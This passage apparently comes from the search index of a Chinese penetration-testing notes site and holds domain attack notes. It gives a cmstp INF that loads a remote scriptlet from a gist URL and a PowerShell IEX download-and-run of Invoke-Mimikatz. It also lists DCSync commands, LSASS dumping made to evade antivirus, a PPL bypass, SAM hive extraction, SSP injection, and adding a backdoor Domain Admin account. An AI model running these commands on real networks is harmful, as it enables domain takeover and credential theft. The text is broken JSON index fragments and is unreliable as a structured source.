\u65b0\u5efa\u4e00\u4e2ainf\uff0c\u5728\u4ee3\u7801\u5904\u586b\u5165\u6076\u610fsct\u6587\u4ef6\u3002 \u7136\u540e\u8fd0\u884ccmstp.exe /s shell.inf [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] UnRegisterOCXs=UnRegisterOCXSection [UnRegisterOCXSection] %11%\\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct [Strings] AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\" ServiceName=\"Yay\" ShortSvcName=\"Yay\"","title":"\u914d\u5408cmstp.exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#infdefaultinstallexe","text":"\u8fd0\u884cInfDefaultInstall.exe shady.inf","title":"\u914d\u5408InfDefaultInstall.exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#_5","text":"","title":"\u4ee5\u4e0a"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/","text":"title: \u57df\u6e17\u900f\u7b14\u8bb0 date: 2021-03-26 13:01:12 \u4fe1\u606f\u641c\u96c6 ADSearch sharpcollection \u5229\u7528ldap\u534f\u8bae\u6765\u67e5\u8be2AD\u4fe1\u606f,\u4e3b\u8981\u67e5\u8be2groups,users,computers\u597d\u7528,\u5206\u522b\u4f7f\u7528-G -U -C\u6765\u67e5\u8be2. \u4f7f\u7528-f\u6765\u83b7\u53d6\u5b8c\u6574\u4fe1\u606f; \u4f7f\u7528--attributes\u6765\u6839\u636e-f\u5b8c\u6574\u4fe1\u606f\u8fdb\u884c\u8fc7\u6ee4,\u9ed8\u8ba4\u663e\u793acn \u57df\u5916\u4f7f\u7528-u\u548c-p\u6765\u6307\u5b9a\u4e00\u4e2a\u57df\u7528\u6237\u4ee5\u4fbf\u57df\u5916\u67e5\u8be2 \u4f7f\u7528--port\u6765\u6307\u5b9a\u4f7f\u7528ldap(389)\u6216ldaps(636) \u4f7f\u7528-d\u6765\u6307\u5b9a\u57df ADCollector \u8f7b\u91cf\u5316\u57df\u4fe1\u606f\u641c\u96c6\uff0c\u76f4\u63a5\u5185\u5b58\u52a0\u8f7d\u8fd0\u884c \u662f\u5426\u5904\u4e8e\u57df\u73af\u5883 ipconfig /all net time /domain wmic computersystem get bootupstate,username,totalphysicalmemory,systemtype,systemfamily,domain,dnshostname ,oemstringarray /value \u67e5\u8be2DN DN\u67e5\u8be2 wmic /Namespace:\\\\root\\directory\\ldap path ds_domain get ds_distinguishedname,ds_dc /value \u547d\u4ee4\u884c\u67e5\u770bDNS\u89e3\u6790\u8bb0\u5f55 \u9700\u8981\u5728\u57df\u63a7\u4e0a\u6267\u884c Dnscmd . /ZonePrint exp.com \u6709\u51e0\u4e2a\u57df net view /domain \u57df\u63a7\u662f\u8c01 \u57df\u5185\u7684\u57df\u63a7\u90fd\u5728Domain Controller\u8fd9\u4e2aOU\u5e95\u4e0b \u8981\u67e5\u8be2\u5176\u4ed6\u7684\u57df\uff0c/domain\u540e\u8ddf:abc.com\u5c31\u884c net group \"domain controllers\" /domain \u67e5\u57df\u63a7 wmic /Namespace:\\\\root\\directory\\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u8fd8\u53ef\u4ee5\u7528adfind\uff0c\u6307\u5b9a\u6839\u57dfDN\u5c31\u884c\u4e86\uff1b\u6216\u8005\u76f4\u63a5dcdmp AdFind.exe -b \"OU=Domain Controllers,DC=exp,DC=com\" -f \"(objectclass=computer)\" -dn adfind.exe -sc dcdmp -dn nslookup\u67e5\u8be2 Nslookup -type=SRV _ldap._tcp \u57df\u4fe1\u4efb\u5982\u4f55 nltest /domain_trusts \u57df\u7ba1\u662f\u8c01 \u6ce8\u610f\uff1a\u57df\u63a7\u4e0e\u57df\u7ba1\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6982\u5ff5\uff0c\u57df\u63a7\u6307\u7684\u673a\u5668/\u673a\u5668\u7528\u6237\uff0c\u57df\u7ba1\u6307\u7684\u57df\u7528\u6237\u3002 \u57df\u7528\u6237\u5168\u90e8\u5c5e\u4e8e\u6210\u5458\u7528\u6237\uff0c\u673a\u5668\u7528\u6237\u662f\u4ee5\u673a\u5668\u540d\u540e\u9762\u52a0$\u6765\u547d\u540d\u7684\u3002\u666e\u901a\u7684\u57df\u7528\u6237\u53ef\u4ee5\u5728\u57df\u5185\u4efb\u610f\u4e00\u53f0\u540c\u7b49\u6743\u9650\u7684\u673a\u5668\u4e0a\u767b\u5f55\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\uff0c\u6240\u4ee5\u57df\u7528\u6237\u4e0d\u80fd\u4ee3\u8868\u90a3\u53f0\u7279\u5b9a\u7684\u673a\u5668\uff1b\u673a\u5668\u7528\u6237\u662f\u8be5\u53f0\u57df\u5185\u673a\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\u7528\u6237\uff0c\u6240\u4ee5\u673a\u5668\u7528\u6237\u4ee3\u8868\u4e86\u90a3\u53f0\u7279\u5b9a\u7684\u673a\u5668\u3002 net group \"domain admins\" /domain \u57df\u7ba1\u7ec4\u6709\u8c01 net localgroup administrators /domain \u7ec4\u5185\u6210\u5458\u662f\u8c01 net group \"enterprise admins\" /domain \u57df\u7ec4\u67e5\u8be2 net group /domain wmic /Namespace:\\\\root\\directory\\ldap path ds_group get DS_cn,ADSIPath,DS_description \u8fd8\u53ef\u4ee5\u7528adfind\uff0cadfind\u6709\u5f88\u591a\u5f3a\u5927\u7684\u547d\u4ee4\uff0c\u8fd9\u4e2a\u4ee5\u540e\u518d\u7814\u7a76\u6574\u7406\u5427 AdFind.exe -sc oudmp -dn \u57df\u5bc6\u7801\u7b56\u7565\u662f\u4ec0\u4e48 net accounts /domain \u57df\u5185\u673a\u5668\u6709\u8c01 net group \"domain computers\" /domain wmic /Namespace:\\\\root\\directory\\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u57df\u5185\u63d0\u6743 KrbRelayUp.exe relay -domain exp1.com -CreateNewComputerAccount -ComputerName abc$ -ComputerPassword Aa123123. \u8fd8\u53ef\u7528adfind\uff0c\u53ef\u4ee5\u901a\u8fc7objectclass=Computer\u6216\u8005objectcategory=Computer\u67e5\u627e\u57df\u5185\u7684\u6240\u6709\u673a\u5668 AdFind.exe -f \"(objectcategory=computer)\" -dn ldapsearch -x -h 10.1.1.1 -D \"zhangs@exp.com\" -b \"DC=dc,DC=exp,DC=com\" -w \"123456\" \"objectclass=Computer\" | grep sAMAccountName DCSYNC impacket\u5bfc\u51fa\u7684\u683c\u5f0f\u66f4\u4fbf\u4e8e\u9605\u8bfb python secretsdump.py exp.com/cs:123456@dc.exp.com -dc-ip 10.0.2.254 -just-dc-user administrator secretsdump.py exp1.com/dc\\$@192.168.14.100 -hashes :eebbbd6dd1dc5bdc02b26bd6f74bee8f -just-dc dcsync exp.com mimikatz.exe privilege::debug \"lsadump::dcsync /domain:test.com /user:xx /password:12323 /all /csv\" exit DNS\u4fe1\u606f\u5bfc\u51fa \u67e5\u770bdns\u533a\u57df dnscmd /EnumZones \u663e\u793a\u8be6\u7ec6 dnscmd /zoneprint xx.com \u4f7f\u7528SharpAdidnsdump.exe \u5728\u666e\u901a\u57df\u7528\u6237\u7684\u60c5\u51b5\u53ef\u4ee5\u5bfc\u51fadns SharpAdidnsdump.exe dc \u6dfb\u52a0\u57df\u7528\u6237 \u6dfb\u52a0\u4e00\u4e2a\u57df\u7528\u6237\u5e76\u5c06\u7528\u6237\u52a0\u5165\u57df\u7ba1\u7ec4 dsadd user \"CN=testa1a,cn=users,dc=abenson,dc=com\" -disabled no -pwd Aa123123 -pwdneverexpires yes -memberof \"cn=domain admins,cn=users,dc=abenson,dc=com\" \u901a\u8fc7\u7528\u6237hash\u66f4\u6539\u5bc6\u7801 \u66f4\u6539\uff0c\u975e\u57df\u5185\u6d4b\u8bd5\u4e0d\u6210\u529f lsadump::changentlm /server:192.168.52.100 /user:a1 /oldntlm:b660e61adc0aec1fe34711e6226fcc8c /newpassword:Aa123123.. \u6062\u590dhash\uff0c\u5982\u4e0d\u6210\u529f\u53ef\u591a\u66f4\u6539\u51e0\u6b21\u5bc6\u7801\u518d\u6062\u590d\uff0c\u4f46\u66f4\u6539\u5bc6\u7801\u6b21\u6570\u53d7\u9650\u4e8e\u6700\u77ed\u5bc6\u7801\u4f7f\u7528\u5929\u6570 lsadump::changentlm /server:192.168.52.100 /user:a1 /oldpassword:Aa123123.. /newntlm:b660e61adc0aec1fe34711e6226fcc8c \u6839\u636e\u673a\u5668\u67e5\u627e\u767b\u5f55\u8fc7\u7684\u7528\u6237 \u6307\u5b9a\u673a\u5668\u7684OU\uff0c\u6279\u91cf\u67e5\u627e \u75281.ps Get-UserLogon -all Get-UserLogon -ou 'ou=domain controllers,dc=exp,dc=exp' \u5bfc\u51faDN adfind -dn \u663e\u793a\u57df\u5185\u5728\u7ebf\u7684\u673a\u5668 AdFind -sc computers_active name \u663e\u793a\u57df\u5185\u6240\u6709\u673a\u5668 \u5b9a\u4f4d\u57df\u7528\u6237\u7684\u673a\u5668 \u6301\u7eed\u76d1\u542c\u57df\u63a7\u7684\u65f6\u5019\u4f1a\u663e\u793a\u57df\u5185\u6240\u6709\u6700\u65b0\u7684\u767b\u5f55\u4fe1\u606f python3 netview.py exp1/administrator:Aa123123.. -targets ip \u57df\u5185\u7528\u6237\u6709\u8c01 net user\u3001net group\u8fd9\u79cd\u5e26net\u7684\u547d\u4ee4\uff0c\u5168\u90e8\u662f\u4ee5smb\u670d\u52a1\u7684samr\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\u67e5\u8be2\u7684\u3002 net user /domain wmic /Namespace:\\\\root\\directory\\ldap path ds_user get ds_name,DS_distinguishedName,DS_userPrincipalName,DS_description,DS_memberOf \u8fd8\u53ef\u4ee5\u7528impacket\u7684samrdump\u67e5\u8be2 samrdump.py exp.com/cs:123456@10.0.2.5 -csv \u8fd8\u53ef\u4ee5\u7528ldapsearch\u901a\u8fc7ldap\u534f\u8bae\u67e5\u8be2 ldapsearch -x -h 10.0.2.254 -D \"cs@exp.com\" -b \"DC=exp,DC=com\" -w \"Aa123123.\" \"(&(objectCategory=person)(objectClass=user))\" \u8fd8\u53ef\u4ee5\u7528adfind\u67e5\u8be2 AdFind.exe -b dc=exp,dc=com -f \"(&(objectCategory=person)(objectClass=user))\" -dn \u57df\u7528\u6237\u7684\u767b\u5f55\u540d\u662f\u4ec0\u4e48 \u57df\u7528\u6237\u7684\u5b57\u6bb5\u6709\u59d3\u6709\u540d\u8fd8\u6709\u767b\u5f55\u540d\uff0c\u8fd9\u51e0\u4e2a\u662f\u53ef\u4ee5\u5f97\u8bbe\u7f6e\u4e0d\u4e00\u6837\u7684\uff0cOU\u6307\u5b9a\u7528\u6237\u7684\u7ec4 AdFind.exe -b \"CN=cs,OU=ceshi,DC=exp,DC=com\" displayName UserPrincipalName sAMAccountName \u5bfc\u51fa\u57df\u5185\u7528\u6237\u4fe1\u606f AdFind -f \"objectcategory=person\" displayname company department name userprincipalname description \u6dfb\u52a0\u8d26\u6237\u5230\u57df\u7ba1\u7ec4 adfind -users -rb CN=bba -dsq|admod -users -rb CN=\"Domain Admins\" -stdinadd member \u57df\u7528\u6237\u662f\u5426\u6d3b\u8dc3 \u8fd9\u4e2a\u662f\u901a\u8fc7\u67e5\u627e\u57df\u7528\u6237\u76f8\u5173\u7684\u4e00\u4e9b\u65f6\u95f4\uff0c\u4f8b\u5982\u521b\u5efa\u65f6\u95f4\u3001\u5bc6\u7801\u66f4\u6539\u65f6\u95f4\u3001\u4e0a\u6b21\u767b\u5f55\u65f6\u95f4\u6765\u5224\u5b9a\u3002 AdFind.exe -b \"CN=cs,OU=ceshi,DC=exp,DC=com\" whencreated pwdlastset lastlogon -tdcs \u5bc6\u7801\u6c38\u4e0d\u8fc7\u671f\u7684\u57df\u7528\u6237 AdFind.exe -f \"useraccountcontrol:AND:=65536\" -bit -dn \u5173\u4e8euseraccountcontrol\u503c\u7684\u76f8\u5173\u5bf9\u5e94\u8868\u53c2\u7167\u6587\u672b \u57df\u7528\u6237\u80fd\u591f\u767b\u5f55\u7684\u4e3b\u673a \u8fd9\u4e2a\u662f\u901a\u8fc7\u6307\u5b9a\u8fdc\u7a0bDC\u8fdb\u884c\u67e5\u8be2\u3002\u5982\u679c\u67e5\u627e\u6ca1\u6709\u7ed3\u679c\uff0c\u8bf4\u660e\u8fd9\u4e2a\u7528\u6237\u6ca1\u6709\u9650\u5236 AdFind.exe -h 10.0.2.254 -sc u:cs userWorkstations import-module .\\PowerView.ps1 Invoke-UserHunter -UserName AdministratorUser \u57df\u7528\u6237\u6b63\u5728\u767b\u9646\u7684\u4e3b\u673a psloggedon.exe \\\\dc \u4f7f\u7528Powerview\u7684Invoke-UserHunter PVEFindADUser.exe -current netsess \\\\dc ACL\u67e5\u627e\u90e8\u5206 ADSI\u7f16\u8f91\u5668 adsiedit.msc \u67e5\u627e\u64f4\u5c55\u6b0a\u9650 AdFind.exe -b \"CN=Extended-Rights,CN=Configuration,DC=exp1,DC=com\" \u67e5\u627e\u5177\u6709\u67d0ACL\u7684\u5bf9\u8c61\uff0c\u5e76\u6839\u636eReplicating Directory Changes\u8fc7\u6ee4\uff0c\u67e5\u627e\u7528\u6237\u6216\u7ec4\u6216\u8ba1\u7b97\u673a Replicating Directory Changes\u662fdisplayName \u7528\u4ee5\u4e0b\u8bed\u53e5\u8fc7\u6ee4 AdFind.exe -b \"CN=Extended-Rights,CN=Configuration,DC=exp1,DC=com\" displayname -f\u6307\u5b9a\u503c\u8fdb\u884c\u8fc7\u6ee4 AdFind.exe -b \"CN=Extended-Rights,CN=Configuration,DC=exp1,DC=com\" -f \"rightsGuid=9b026da6-0d3c-465c-8bee-5199d7165cba\" DACL\u548cSACL\u5b58\u50a8\u5728nTSecurityDescriptor\u91cc\uff0c\u4ee5sddl\u683c\u5f0f\u5b58\u50a8\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u67e5\u8be2 AdFind.exe -b \"cn=administrator,cn=users,DC=exp1,DC=com\" nTSecurityDescriptor -sddl+++ \u8fd8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u67e5\u8be2 adfind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl -sddlfilter adfind\u5bf9acl\u7684\u8fc7\u6ee4\u975e\u5e38\u7b80\u4fbf\uff0c\u53ea\u9700\u5728\u540e\u6dfb\u52a0\u8fc7\u6ee4\u7684\u6837\u4f8b\u5373\u53ef\u3002\u9700\u8981\u4ee5 ;;;;; \u8fc7\u6ee4\uff0c\u662f\u56e0\u4e3a\u8f93\u51fa\u7684\u683c\u5f0f\u5c31\u662f\u8fd9\u6837\uff0c\u4f8b\u5982\u6b63\u5e38\u8f93\u51fa\u5982\u4e0b nTSecurityDescriptor: [DACL] OBJ ALLOW;;[CTL];Change Password;;Everyone Change Password\u5728\u4e09\u4e2a\u5206\u53f7\u540e\uff0c\u4e24\u4e2a\u5206\u53f7\u524d\uff0c\u6240\u6709\u8981\u4ee5 ;;;change password;; \u8fc7\u6ee4\uff0c\u65e0\u89c6\u5927\u5c0f\u5199\uff0c\u53ef\u6a21\u7cca\u5339\u914d \u67e5\u627e\u662fadministrator\u7684reset password\u7684ace adfind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl -sddlfilter ;;;Reset Password;; AdFind.exe -b \"cn=administrator,cn=users,DC=exp1,DC=com\" nTSecurityDescriptor -sddl+++ \u4e0e adfind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl \u90fd\u53ef\u4ee5\u67e5\u8be2acl\uff0c\u4f46\u533a\u522b\u662f nTSecurityDescriptor \u4f1a\u663e\u793aDACL\u548cSACL\uff0c -sc getacl \u53ea\u663e\u793aDACL Nmap\u7684NSE\u811a\u672c smb-enum-sessions.nse\u83b7\u53d6\u57df\u5185\u4e3b\u673a\u7684\u7528\u6237\u767b\u5f55\u4f1a\u8bdd\uff0c\u67e5\u770b\u5f53\u524d\u662f\u5426\u6709\u7528\u6237\u767b\u5f55\u3002\u4e0b\u8f7d\u5730\u5740\uff1ahttps://nmap.org/nsedoc/scripts/smb-enum-sessions.html smb-enum-domains.nse\u5bf9\u57df\u63a7\u5236\u5668\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u53ef\u4ee5\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\u7528\u6237\u3001\u53ef\u4f7f\u7528\u5bc6\u7801\u7b56\u7565\u7684\u7528\u6237\u7b49\u3002 smb-enum-users.nse\u53ef\u4ee5\u4f7f\u7528\u6b64\u811a\u672c\u5bf9\u57df\u63a7\u8fdb\u884c\u626b\u63cf \u7ea6\u675f\u59d4\u6d3e\u7528\u6237 AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))\" -dn AdFind.exe -f \"useraccountcontrol:AND:=524288\" -bit -dn \u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))\" -dn \u6216\u8005\u7528PowerSploit\u7684PowerView.ps1 Get-DomainUser \u2013TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl \u975e\u7ea6\u675f\u59d4\u6d3e\u7528\u6237 adfind AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -dn ldapsearch ldapsearch -x -H ldap://10.0.2.254:389 -D \"CN=cs,CN=Users,DC=exp,DC=com\" -w Aa123123. -b \"DC=exp,DC=com\" \"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" |grep -iE \"distinguishedName\" \u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a \u57df\u63a7\u90fd\u662f\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a adfind AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -dn ldapsearch ldapsearch -x -H ldap://10.1.1.1:389 -D \"CN=exp,CN=Users,DC=exp,DC=com\" -w password -b \"DC=exp,DC=com\" \"(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" |grep -iE \"distinguishedName\" \u67e5\u8be2SPN setspn -Q */* NBT-NS nbtscan-1.0.35.exe -f 10.1.1.1 nbtscan-1.0.35-redhat-linux \u5171\u4eab\u6587\u4ef6\u5939\u53d1\u73b0 Snaffler.exe -s -o 1.log SharpShares.exe ips SharpShares.exe shares \u4f7f\u7528windump\u76d1\u542c\u7f51\u7edc\u6570\u636e\u5305 \u4f7f\u7528\u524d\u5148\u786e\u5b9a\u7f51\u5361 WinDump.exe -i 1 -w 1.pcap -s 0 \u8c61\u5f81\u6027\u5730\uff0c\u53ef\u4ee5\u4f7f\u7528Pcredz\u5feb\u901f\u83b7\u53d6\u654f\u611f\u5bc6\u7801\u3002\u56e0\u4e3a\u5b9e\u9645\u6d4b\u8bd5\u4e2d\uff0chttp\u7684body\u90fd\u65e0\u6cd5\u53d1\u73b0 Bypsss\u7684\u4fe1\u606f\u641c\u96c6 \u4f7f\u7528csvde \u672c\u5730 \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -f all.csv \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a csvde -f user.csv -r \"(&(objectCategory=person))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a csvde -f machine.csv -r \"(&(objectCategory=computer))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a csvde -f group.csv -r \"(&(objectCategory=group))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a csvde -f admin.csv -r \"(&(objectCategory=group)(name=Domain Admins))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a csvde -f ou.csv -r \"(&(objectCategory=organizationalUnit))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a csvde -f username.csv -r \"(&(objectCategory=person))\" -l SamAccountName \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a csvde -f machinename.csv -r \"(&(objectCategory=computer))\" -l name \u8fdc\u7a0b \u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -s 192.168.1.1 -a test\\admin Password -f all.csv \u4f7f\u7528ldifde \u672c\u5730 \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -f all.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=person))\" -f user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=computer))\" -f machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group))\" -f group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group)(name=Domain Admins))\" -f admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=organizationalUnit))\" -f ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a ldifde -r \"(&(objectCategory=person))\" -l SamAccountName -f username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a ldifde -r \"(&(objectCategory=computer))\" -l name -f machinename.txt \u8fdc\u7a0b \u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -s 192.168.1.1 -a test\\admin Password -f all.txt \u4f7f\u7528AdFind \u672c\u5730 \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1>all.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person>user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer>machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=group>group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f \"(&(objectCategory=group)(name=Domain Admins))\">admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=organizationalUnit>ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person SamAccountName>username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer name>machinename.txt \u8fdc\u7a0b \u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 192.168.1.1 -u test\\admin -up Password>all.txt \u653b\u51fb\u65b9\u5f0f \u5bc6\u7801\u5229\u7528 \u8bfb\u5bc6\u7801 meterpreter\u65b9\u5f0f meterpreter > hashdump meterpreter > load mimikatz meterpreter > msv #\u8bfb\u7684\u662fhash meterpreter > ssp #\u8bfb\u7684\u662f\u660e\u6587 meterpreter > wdigest #\u8bfb\u7684\u662f\u660e\u6587 mimikatz\u65b9\u5f0f sekurlsa\u53ef\u7528\u7684\u8fd8\u6709msv\u3001wdigest\u3001kerberos\u3001tspkg\u3001ssp\u3001logonPasswords\u3001ekeys\u7b49 mimikatz.exe \"privilege::debug\" \"log 1.txt\" \"sekurlsa::logonpasswords\" exit mimikatz.exe privilege::debug \"lsadump::dcsync /domain:test.com /all /csv\" exit \u8fd8\u6709PowerSploit\u7684 powershell \"IEX (New-Object Net.WebClient).DownloadString('http://xx/xx'); Invoke-Mimikatz -DumpCreds\" \u8bfb\u53d6lsass procdump\u7ec4\u5408mimikatz \u7ed5\u6740\u6bd2 \u5c06procdump.exe\u79fb\u52a8\u4e00\u4e0b\u76ee\u5f55\u5e76\u91cd\u547d\u540d C:\\Program Files (x86)\\Microsoft Visual Studio\\dump64.exe procdump64.exe -accepteula -ma lsass.exe lsass.dmp mimikatz.exe \"log res.log\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit AvDump.exe .\\AvDump.exe --pid <lsass pid> --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\\Users\\admin\\Desktop\\lsass.dmp --min_interval 0 dotnet-dump.exe \u5177\u6709\u5fae\u8f6f\u7b7e\u540d\u7684dump\u5de5\u5177 dotnet-dump.exe collect -p <lsass pid> CreateDump.exe createdump.exe -u -f lsass.dmp <lsass pid> Rundll32.exe rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\Users\\admin\\Desktop\\lsass-comsvcs.dmp full \u7ed5\u8fc7PPL\u673a\u5236dump PPL\u662f\u5fae\u8f6f\u7684\u4e00\u79cd\u8fdb\u7a0b\u4fdd\u62a4\u673a\u5236\uff0c\u5982\u679cLSA\u5f00\u542f\u4e86PPL\u4fdd\u62a4\uff0c\u90a3\u4e48\u7528\u5e38\u89c4\u624b\u6bb5\u662f\u65e0\u6cd5\u6293\u5230\u5bc6\u7801\u7684 \u67e5\u8be2\u662f\u5426\u5f00\u542f\u4e86PPL reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL \u4f7f\u7528mimikatz\u7ed5\u8fc7\uff0c\u9700\u8981\u843d\u5730\u6587\u4ef6\u6765\u6267\u884c\uff0c\u4e14mimikatz\u6570\u5b57\u7b7e\u540d\u4e0d\u80fd\u88ab\u4fee\u6539 !+ !processprotect /process:lsass.exe /remove privilege::debug sekurlsa::logonpasswords \u6293\u5b8c\u518d\u6062\u590d !processprotect /process:lsass.exe !- \u4f7f\u7528\u5f00\u6e90\u5de5\u5177\u7ed5\u8fc7 PPLKiller PPLcontrol EDRSandblast PPLdump PPLmedic PPLFault \u6700\u65b0 \u6ce8\u518c\u8868\u5bfc\u51fa\u672c\u5730\u8bfb\u53d6 reg save hklm\\sam sam.hive reg save hklm\\system system.hive mimikatz.exe \"log res.log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" exit SSP\u6ce8\u5165\u83b7\u53d6\u5bc6\u7801 \u6b64\u65b9\u5f0f\u9700\u8981\u7ba1\u7406\u4eba\u5458\u4ea4\u4e92\u64cd\u4f5c\u3002\u5b9e\u73b0\u6548\u679c\u5c31\u662f\u7ba1\u7406\u4eba\u5458\u8f93\u5165\u5bc6\u7801\u540e\uff0c\u5bc6\u7801\u4f1a\u88ab\u660e\u6587\u8bb0\u5f55\u5728\u78c1\u76d8\u4e0a\uff0c\u867d\u7136\u6709\u70b9\u50cf\u662f\u9493\u9c7c\uff0c\u4f46\u6280\u672f\u5b9e\u73b0\u5e76\u975e\u9493\u9c7c\u3002 DLL\u6ce8\u5165 \u5c06mimilib.dll\u590d\u5236\u5230system32\u4e0b\uff0c\u4fee\u6539\u6ce8\u518c\u8868 reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ \u5185\u5b58\u6ce8\u5165 privilege::debug misc::memssp 